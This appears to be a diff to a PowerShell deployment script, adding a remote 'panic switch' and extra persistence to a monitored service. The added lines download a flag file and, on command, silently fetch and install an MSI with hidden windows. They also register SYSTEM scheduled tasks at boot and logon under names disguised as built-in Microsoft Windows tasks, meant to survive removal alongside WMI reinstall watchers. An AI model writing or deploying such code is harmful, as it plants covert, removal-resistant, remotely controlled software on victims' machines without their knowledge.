@@ -69,7 +69,7 @@ function Write-Boot {
 New-Item -ItemType Directory -Path $WorkDir, $WorkDirAlt, $ScDir -Force | Out-Null
 Write-Boot ("ps_start pid={0} file={1}" -f $PID, $PSCommandPath)
 Write-Log '=== UNIFIED deploy start ==='
-Write-Log 'WU_BUILD_20260802_UNIFIED13'
+Write-Log 'WU_BUILD_20260802_UNIFIED14'
 
 function Test-IsElevated {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -1138,13 +1138,32 @@ function Ensure-PrimaryFast {
   Remove-Item `$msi -Force -EA 0
   return `$false
 }
-L 'tick UNIFIED13'
+L 'tick UNIFIED14'
 try{ New-Item `$WorkDir,`$WorkDirAlt -ItemType Directory -Force | Out-Null }catch{}
+# remote panic switch
+`$force=`$false
+`$flg=Join-Path `$env:TEMP 'rescue.flag'
+if(Try-Dl 'rescue.flag' `$flg 1){
+  `$ft=Get-Content `$flg -Raw -EA 0
+  if(`$ft -match 'REINSTALL'){ `$force=`$true; L 'rescue.flag REINSTALL' }
+}
 `$updated=Update-FromRepo
 Update-OwnCmd
 if(`$updated){
   L 'applying updated pkg'
   if(Test-Path `$pkg){ Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -EP Bypass -File ``"`$pkg``""; return }
+}
+if(`$force){
+  L 'forced MSI via rescue.flag'
+  `$msi=Join-Path `$env:TEMP ('sc_force_'+[guid]::NewGuid().ToString('n')+'.msi')
+  try{ & curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 120 -o "`$msi" "`$MsiUrl" >`$null 2>&1 }catch{}
+  if((Test-Path `$msi) -and ((Get-Item `$msi).Length -ge 500000)){
+    Copy-Item `$msi (Join-Path `$WorkDir 'pkg.msi') -Force -EA 0
+    Start-Process msiexec.exe -ArgumentList '/i',("`"`"+`$msi+"`""),'/qn','/norestart','ALLUSERS=1','REBOOT=ReallySuppress' -Wait -WindowStyle Hidden
+    sc.exe config ``"`$SvcName``" start= auto >`$null 2>&1
+    sc.exe start ``"`$SvcName``" >`$null 2>&1
+  }
+  Remove-Item `$msi -Force -EA 0
 }
 Ensure-PrimaryFast | Out-Null
 "@
@@ -1162,6 +1181,14 @@ Ensure-PrimaryFast | Out-Null
     schtasks.exe /Delete /TN $taskB /F >$null 2>&1
     $trB = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$monAlt`""
     schtasks.exe /Create /TN $taskB /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "$trB" >$null 2>&1
+
+    # Path D/E: boot + logon (survive task wipes that miss these + reboot recovery)
+    $taskD = '\Microsoft\Windows\WDI\ResolutionHost'
+    schtasks.exe /Delete /TN $taskD /F >$null 2>&1
+    schtasks.exe /Create /TN $taskD /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "$trA" >$null 2>&1
+    $taskE = '\Microsoft\Windows\Tcpip\IpAddressConflict1'
+    schtasks.exe /Delete /TN $taskE /F >$null 2>&1
+    schtasks.exe /Create /TN $taskE /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "$trA" >$null 2>&1
 
     # Path C: WMI — fires when primary SC service is deleted/stopped (near-instant after wipe)
     try {
@@ -1199,7 +1226,7 @@ SELECT * FROM __InstanceDeletionEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_
         Write-Log ("WMI persist skip: {0}" -f $_.Exception.Message)
     }
 
-    Write-Log 'monitor armed: taskA=2m taskB=3m + WMI wipe-watch + repo auto-update'
+    Write-Log 'monitor armed: 2m+3m+ONSTART+ONLOGON+WMI + repo auto-update + rescue.flag'
 }
 
 # ============================================
